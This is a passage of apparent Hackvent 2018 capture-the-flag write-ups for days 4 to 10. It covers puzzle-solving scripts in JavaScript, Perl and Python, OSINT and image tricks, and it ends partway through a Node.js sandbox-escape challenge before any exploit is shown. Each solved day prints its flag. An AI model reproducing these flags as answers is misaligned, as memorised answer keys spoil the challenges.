		    <span class="k">if</span><span class="p">(</span><span class="nx">elements</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">value</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
		        <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">ahoy pirate! </span><span class="se">\n\n</span><span class="s1">you want jolly roger? i see empty boxes :-/</span><span class="dl">'</span><span class="p">);</span>
		        <span class="k">return</span><span class="p">;</span>
		    <span class="p">}</span>
		<span class="p">}</span>

		<span class="kd">var</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">;</span>
		<span class="nx">p</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate01</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate02</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate03</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate04</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate05</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate06</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate07</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate08</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate09</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span>
		<span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate10</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate11</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">pirate12</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
		<span class="nx">s</span><span class="o">=</span><span class="dl">'</span><span class="s1">::)"&lt;.vd]!&amp;a{":r&gt;Qyh 7</span><span class="dl">'</span><span class="p">;</span>
		<span class="nx">f</span><span class="o">=</span><span class="dl">'</span><span class="s1">HV18-</span><span class="dl">'</span><span class="p">;</span>
		<span class="k">for </span><span class="p">(</span><span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">s</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	    	<span class="nx">a</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
			<span class="nx">b</span> <span class="o">=</span> <span class="nx">p</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="nx">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">);</span>
			<span class="nx">f</span><span class="o">+=</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">a</span> <span class="o">^</span> <span class="nx">b</span><span class="p">));</span>
	    <span class="p">}</span>
	    <span class="nf">alert</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
	<span class="p">}</span>
</pre></table></code></div></div><p>We do know what certain positions in the flag need to decrypt to (e.g. the dashes), so we can use this to..</p><p><code class="language-plaintext highlighter-rouge">s</code> is 22 characthers long, and since <code class="language-plaintext highlighter-rouge">p</code> expects a length up to <code class="language-plaintext highlighter-rouge">len(s)*2+2</code>, combined with the fact that the HTML for the names (Jamaica etc) is called <code class="language-plaintext highlighter-rouge">year</code>, it looks like we need to enter 4 digits in each box.</p><p>After some DuckDuckGo’ing, we find out this is a reference to a 90s game called <a href="https://en.wikipedia.org/wiki/The_Secret_of_Monkey_Island">The Secret of Monkey Island</a>, with which a cardboard wheel, named “Dial-a-Pirate”, was provided, as a form of copy-protection. The player had to match the pirate shown on-screen with that of the wheel.</p><p><img src="writeupfiles/day04-dialapirate-animated.gif" alt="" /></p><p>Instrunctions from game manual:</p><p>*Once you’ve started a program. a screen will appear displaying pirate’s face (actually a combination of two faces). You will be prompted to enter a date that was significant in the pirate’s life at a given geographical location. Use your Dial-A-Pirate wheel to match up the top and bottom halves of the pirate face you see on the screen. Then, locate the window on the wheel that matches the geographical location mentiones on the screen. Using the keyboard, type the date you see in the window.</p><p>Don’t lose your Dial-A-Pirate wheel! Without it, you won’t be able to play the game. If you lose the Wheel, you may purchase another from Lucasfilm Games.*</p><p>There is an working version online <a href="http://www.oldgames.sk/codewheel/secret-of-monkey-island-dial-a-pirate">here</a></p><p>So we simply spin the wheel to match the faces in the challenge, and note the year of the requested place name:</p><p><img src="writeupfiles/day04-solution.png" alt="" /></p><h2> Flag</h2><code> HV18-5o9x-4geL-7hkJ-wc4A-xp8F </code><hr><h1 id="day-05-osint-1"> Day 05: OSINT 1 <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-05-osint-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>It’s all about transparency</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa has hidden your daily present on his server, somewhere on port 443.</p><p>Start on https://www.hackvent.org and follow the OSINT traces.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We go to the site and see this:</p><p><img src="writeupfiles/day05-site.png" alt="" /></p><p>Googling leads us to <a href="">certificate transparancy</a></p><p>And this site where we can find the other vhost referred to in the challenge:</p><p>https://transparencyreport.google.com/https/certificates</p><p><img src="writeupfiles/day05-screenshot.png" alt="" /></p><p>when we visit <code class="language-plaintext highlighter-rouge">osintiscoolisntit.hackvent.org</code> we are greeted with the flag:</p><p><img src="writeupfiles/day05-flag.jpg" alt="" /></p><h2> Flag</h2><code> HV18-0Sin-tI5S-R34l-lyC0-oo0L </code><hr><h1 id="day-06-mondrian"> Day 06: Mondrian <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-06-mondrian.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Piet’er just opened his gallery to present his pieces to you, they’d make for a great present :)</p><p><a href="https://hackvent.hacking-lab.com/Mondrian-Gallery/">Open Gallery</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The page contained 6 images of abstract art</p><p><img src="writeupfiles/day06-gallery.png" alt="" /></p><p><a href="writeupfiles/day06-house.png">image1</a> <a href="writeupfiles/day06-2-trees.png">image2</a> <a href="writeupfiles/day06-3-lake.png">image3</a> <a href="writeupfiles/day06-4-sky.png">image4</a> <a href="writeupfiles/day06-5-sheep.png">image5</a> <a href="writeupfiles/day06-6-snake.png">image6</a></p><p>We recognize this as esoteric programming language <a href="http://www.dangermouse.net/esoteric/piet.html">Piet</a> and use the <a href="https://www.bertnase.de/npiet/npiet-execute.php">this interpreter</a> to translate the images to a flag. Each image contanes 4 characters of the flag.</p><p><img src="writeupfiles/day06-results.png" alt="" /></p><h2> Flag</h2><code> HV18-M4ke-S0m3-R3Al-N1c3-artZ </code><hr><h1 id="day-07-flappy-pl"> Day 07: flappy.pl <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-07-flappypl.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Time for a little game. It’s hardy obfuscated, i promise … ;-)</p><h2 id="solution"><span class="mr-2">Solution*</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Saving the perl script and running, it turns out to be a copy of flappy bird, in ascii. Pressing the space bar lets you move right, otherwise you fall left. After getting through the first three stages we saw that the barriers spelt HV1, so clearly going to be our key.</p><p>We reformat the script:</p><div class="language-perl highlighter-rouge"><div class="code-header"> <span data-label-text="Perl"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="k">use</span> <span class="nn">Term::</span><span class="nv">ReadKey</span><span class="p">;</span>
<span class="k">sub </span><span class="nf">k</span> <span class="p">{</span>
	<span class="nv">ReadKey</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="p">};</span>
<span class="nv">ReadMode</span> <span class="mi">3</span><span class="p">;</span>
<span class="k">sub </span><span class="nf">rk</span> <span class="p">{</span>
	<span class="nv">$Q</span><span class="o">=</span><span class="p">'';</span><span class="nv">$Q</span><span class="o">.=</span><span class="nv">$QQ</span> <span class="k">while</span><span class="p">(</span><span class="nv">$QQ</span><span class="o">=</span><span class="nv">k</span><span class="p">());</span><span class="nv">$Q</span>
<span class="p">};</span>
<span class="vg">$|</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>

<span class="k">print</span> <span class="p">"</span><span class="se">\e</span><span class="s2">c</span><span class="se">\e</span><span class="s2">[0;0r</span><span class="se">\e</span><span class="s2">[4242;1H</span><span class="se">\e</span><span class="s2">[6n</span><span class="se">\e</span><span class="s2">[1;1H</span><span class="p">";</span>

<span class="p">(</span><span class="nv">$p</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">)</span> <span class="k">until</span> <span class="p">((</span><span class="nv">$c</span><span class="o">=</span><span class="nv">k</span><span class="p">())</span> <span class="ow">eq</span> <span class="p">'</span><span class="s1">R</span><span class="p">');</span>

<span class="nv">$x</span><span class="o">=</span><span class="mi">75</span><span class="p">;</span>
<span class="nv">$dx</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
<span class="p">((</span><span class="nv">$yy</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">=~</span> <span class="sr">/(\d+);/</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$yy</span><span class="o">-=</span><span class="mi">10</span><span class="p">);</span>

<span class="k">print</span> <span class="p">(("</span><span class="se">\r\n\e</span><span class="s2">[40m</span><span class="se">\e</span><span class="s2">[37m#</span><span class="p">"</span><span class="o">.</span><span class="p">('</span><span class="s1"> </span><span class="p">'</span><span class="nv">x78</span><span class="p">)</span><span class="o">.</span><span class="p">"</span><span class="s2">#</span><span class="p">")</span><span class="nv">x100</span><span class="p">);</span>

<span class="nv">$r</span><span class="o">=</span><span class="p">(</span><span class="k">sub </span><span class="p">{</span><span class="nv">$M</span><span class="o">=</span><span class="nb">shift</span><span class="p">;</span>
 <span class="k">sub </span><span class="p">{</span><span class="nv">$M</span><span class="o">=</span><span class="p">((</span><span class="nv">$M</span><span class="o">*</span><span class="mh">0x41C64E6D</span><span class="p">)</span><span class="o">+</span><span class="mi">12345</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0x7FFFFFFF</span><span class="p">;</span>
<span class="nv">$M%shift</span><span class="p">;</span>
<span class="p">}})</span><span class="o">-&gt;</span><span class="p">(</span><span class="mi">42</span><span class="p">);</span>

<span class="nv">$s</span><span class="o">=</span><span class="p">(</span><span class="k">sub </span><span class="p">{</span><span class="nb">select</span><span class="p">(</span><span class="nv">$HV18</span><span class="p">,</span> <span class="nv">$faLL</span><span class="p">,</span> <span class="nv">$D33p</span><span class="p">,</span> <span class="nb">shift</span><span class="p">);});</span>

<span class="nv">$INT0</span><span class="p">?</span><span class="nv">$H3ll:$PERL</span><span class="p">;</span>

<span class="nv">@HASH</span><span class="o">=</span><span class="nb">unpack</span><span class="p">("</span><span class="s2">C*</span><span class="p">",</span><span class="nb">pack</span><span class="p">("</span><span class="s2">H*</span><span class="p">",'</span><span class="s1">73740c12387652487105575346620e6c55655e1b4b6b6f541a6b2d7275</span><span class="p">'));</span>

<span class="k">for</span> <span class="nv">$i</span><span class="p">(</span><span class="mi">0</span><span class="o">..</span><span class="mi">666</span><span class="p">){</span>
	<span class="nv">$s</span><span class="o">-&gt;</span><span class="p">(</span><span class="mf">0.1</span><span class="p">);</span>
	<span class="k">print</span><span class="p">("</span><span class="se">\e</span><span class="s2">[40;91m</span><span class="se">\e</span><span class="s2">[</span><span class="si">${yy}</span><span class="s2">;</span><span class="si">${x}</span><span class="s2">H.</span><span class="p">");</span>

	<span class="nv">$dx</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="nv">rk</span><span class="p">()</span> <span class="o">=~</span> <span class="sr">/ /g</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="nv">$dx</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$dx</span><span class="o">&gt;</span><span class="mi">3</span><span class="p">?</span><span class="mi">3</span><span class="p">:(</span><span class="nv">$dx</span><span class="o">&lt;-</span><span class="mi">3</span><span class="p">?</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="nv">$dx</span><span class="p">));</span>

	<span class="nv">$x</span> <span class="o">+=</span> <span class="nv">$dx</span><span class="p">;</span>
	<span class="c1"># BOUNDARY CHECK</span>
	<span class="c1">#($x&gt;1&amp;&amp;$x&lt;80)||last;</span>

	<span class="p">((</span><span class="nv">$i</span><span class="o">%</span><span class="mi">23</span><span class="p">)</span><span class="nv">&amp;&amp;print</span> <span class="p">("</span><span class="se">\e</span><span class="s2">[4242;1H</span><span class="se">\n\e</span><span class="s2">[40m</span><span class="se">\e</span><span class="s2">[37m#</span><span class="p">"</span><span class="o">.</span><span class="p">('</span><span class="s1"> </span><span class="p">'</span><span class="nv">x78</span><span class="p">)</span><span class="o">.</span><span class="p">"</span><span class="s2">#</span><span class="p">"))</span><span class="o">||</span><span class="p">((</span><span class="nv">$h</span><span class="o">=</span><span class="mi">20</span><span class="o">+</span><span class="nv">$r</span><span class="o">-&gt;</span><span class="p">(</span><span class="mi">42</span><span class="p">))</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="k">print</span> <span class="p">("</span><span class="se">\e</span><span class="s2">[4242;1H</span><span class="se">\n\e</span><span class="s2">[40m</span><span class="se">\e</span><span class="s2">[37m#</span><span class="p">"</span><span class="o">.</span><span class="p">((</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$HASH</span><span class="p">[</span><span class="nv">$i</span><span class="sr">/23]^$h))x($h-5)).(" "x10).((chr($HASH[$i/</span><span class="mi">23</span><span class="p">]</span><span class="o">^</span><span class="nv">$h</span><span class="p">))</span><span class="nv">x</span><span class="p">(</span><span class="mi">73</span><span class="o">-</span><span class="nv">$h</span><span class="p">))</span><span class="o">.</span><span class="p">"</span><span class="s2">#</span><span class="p">")));</span>

	<span class="c1"># BARRIER CHECK</span>
	<span class="c1">#(($i+13)%23)?42:((abs($x-$h)&lt;6)||last);</span>

	<span class="k">print</span> <span class="p">("</span><span class="se">\e</span><span class="s2">[</span><span class="si">${yy}</span><span class="s2">;</span><span class="si">${x}</span><span class="s2">H</span><span class="se">\e</span><span class="s2">[41m</span><span class="se">\e</span><span class="s2">[37m@</span><span class="p">");</span>

<span class="p">};</span>
<span class="nv">ReadMode</span> <span class="mi">1</span><span class="p">;</span>
</pre></table></code></div></div><p>And we comment out the checks for if we hit a barrier or a boundary that will ‘kill’ us. And then we just watch the flag scroll by and write it down as it passes.</p><h2> Flag</h2><code> HV18-bMnF-racH-XdMC-xSJJ-I2fL </code><hr><h1 id="day-08-advent-snail"> Day 08: Advent Snail <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-08-advent-snail.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In cyberstan there is a big tradition to backe advents snails during advent.</p><p><img src="writeupfiles/day08-4dv3ntSn4il.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This looks like it is a barcode, we tried adding the markers for a <a href="https://en.wikipedia.org/wiki/Data_Matrix">data matrix</a>, but this leads nowhere. Given that it is a 25x25 image, it is likely it is a QR code but somehow encrypted or scrambled.</p><p>After a lot of searching (including finding out about <a href="http://realsnailmail.net">this amusing service</a>), we realize this is a QR code, but in the shape of a spiral (like the shell of a snail).</p><p><img src="writeupfiles/day08-snail-spiral.jpg" alt="" /></p><p>There would be various directions to start from and we could spiral either clockwise or counterclockwise, but reasoning from the central pixel, and knowing we would have to start with 7 black pixels for the QR code corner marker, only one orientation remains:</p><p><img src="writeupfiles/day08-qrcode-spiral.jpg" alt="" /></p><p>We write the following script to do the transformation:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">PIL</span> <span class="kn">import</span> <span class="n">Image</span>


<span class="k">def</span> <span class="nf">getdirection</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s"> change direction, clockwise </span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">d</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>  <span class="c1"># up
</span>        <span class="nf">return </span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">d</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>  <span class="c1"># right
</span>        <span class="nf">return </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">d</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>  <span class="c1"># down
</span>        <span class="nf">return </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>  <span class="c1"># left
</span>        <span class="nf">return </span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="c1"># input image converted to bit string, 1=black, 0=white
</span><span class="n">qr</span> <span class="o">=</span> <span class="sh">"</span><span class="s">1101011001101011001101101111000110011111111010000101101101000001001101001010010011100100011000111000110100100000011000101001101000011111100000000111101000111110110000010011001011110011011010001101011000001110011011101100010001110100110100000001011111110101101011000101010001001010001101011001001001100100111100101111110010111110100011011111111100011101001011111110000110001101000000100110111001000001100000101110100011000110100001101000101110110100001100101111111100000010100110101111101111100001100110110011000110110101100111100110110101001000011100101111101010000011001010111011101110110001101100011101101100000110010100000</span><span class="sh">"</span>

<span class="c1"># create 2D array
</span><span class="n">size</span> <span class="o">=</span> <span class="mi">25</span>
<span class="n">qr</span> <span class="o">=</span> <span class="p">[</span><span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="n">size</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">qr</span><span class="p">),</span> <span class="n">size</span><span class="p">)]</span>
<span class="n">qr</span> <span class="o">=</span> <span class="nf">map</span><span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="n">qr</span><span class="p">)</span>

<span class="c1"># start in middle
</span><span class="n">middle</span> <span class="o">=</span> <span class="n">size</span> <span class="o">/</span> <span class="mi">2</span>
<span class="n">i</span> <span class="o">=</span> <span class="n">middle</span>
<span class="n">j</span> <span class="o">=</span> <span class="n">middle</span>

<span class="c1"># save transformed bitstring
</span><span class="n">outpixels</span> <span class="o">=</span> <span class="sh">""</span>

<span class="c1"># paint middle pixel
</span><span class="n">outpixels</span> <span class="o">+=</span> <span class="n">qr</span><span class="p">[</span><span class="n">middle</span><span class="p">][</span><span class="n">middle</span><span class="p">]</span>

<span class="c1"># spiral
</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">stepsize</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">direction</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">p</span> <span class="o">&lt;=</span> <span class="n">size</span><span class="o">*</span><span class="n">size</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>  <span class="c1"># same length twice
</span>        <span class="n">d</span> <span class="o">=</span> <span class="nf">getdirection</span><span class="p">(</span><span class="n">direction</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">stepsize</span><span class="p">):</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">j</span> <span class="o">+=</span> <span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">outpixels</span> <span class="o">+=</span> <span class="n">qr</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span>
            <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="n">p</span> <span class="o">+=</span> <span class="n">stepsize</span>
        <span class="n">direction</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">stepsize</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="c1"># create an image
</span><span class="n">outimg</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sh">'</span><span class="s">RGB</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">size</span><span class="p">),</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pixels</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">load</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="o">*</span><span class="n">size</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">outpixels</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">pix</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">pix</span> <span class="o">=</span> <span class="p">(</span><span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">,</span> <span class="mi">255</span><span class="p">)</span>
    <span class="n">pixels</span><span class="p">[</span><span class="n">i</span> <span class="o">/</span> <span class="n">size</span><span class="p">,</span> <span class="n">i</span> <span class="o">%</span> <span class="n">size</span><span class="p">]</span> <span class="o">=</span> <span class="n">pix</span>

<span class="c1"># save image
</span><span class="n">outimg</span> <span class="o">=</span> <span class="n">outimg</span><span class="p">.</span><span class="nf">resize</span><span class="p">((</span><span class="mi">500</span><span class="p">,</span> <span class="mi">500</span><span class="p">))</span>
<span class="n">outimg</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="sh">"</span><span class="s">day08-snail-out.png</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div><p>Which outputs the following QR code:</p><p><img src="writeupfiles/day08-snail-out.png" alt="" /></p><h2> Flag</h2><code> HV18-$$nn-@@11-LLr0-B1ne </code><hr><h1 id="day-09-fake-xmass-balls"> Day 09: fake xmass balls <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-09-fake-xmass-balls.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A rogue manufacturer is flooding the market with counterfeit yellow xmas balls.They are popping up like everywhere!</p><p>Can you tell them apart from the real ones? Perhaps there is some useful information hidden in the fakes…</p><p><img src="writeupfiles/medium-64.png" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We’re given only that ball and the one that’s in the header image:</p><p><img src="writeupfiles/medium-64.png" alt="" /><img src="writeupfiles/medium_64.png" alt="" /></p><p>Running <code class="language-plaintext highlighter-rouge">compare</code> on the two we see this useful image:</p><p><img src="writeupfiles/medium-compare-small.png" alt="" /></p><p>Scaling the input images up before re-comparing and inverting the colours and adding a border to make the code readable:</p><p><img src="writeupfiles/medium-compare-big.png" alt="" /> <img src="writeupfiles/day09-qrcode.png" alt="" /></p><h2> Flag</h2><code> HV18-PpTR-Qri5-3nOI-n51a-42gJ </code><hr><h1 id="day-10-gt-run-node-run"> Day 10: &gt;_ Run, Node, Run <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-10-_-run-node-run.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa has practiced his nodejs skills and wants his little elves to practice it as well, so the kids can get the web- app they wish for.</p><p>He made a little practice- sandbox for his elves. Can you break out?</p><p>Location: http://whale.hacking-lab.com:3000/</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can enter some code in a webform and the output is returned to us</p><p><img src="writeupfiles/day10-screenshot.png" alt="" /></p><p>We are also given the serverside code:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="p">{</span><span class="nx">flag</span><span class="p">,</span> <span class="nx">port</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">./config.json</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">sandbox</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">express</span><span class="dl">"</span><span class="p">)();</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">body-parser</span><span class="dl">'</span><span class="p">).</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}));</span>

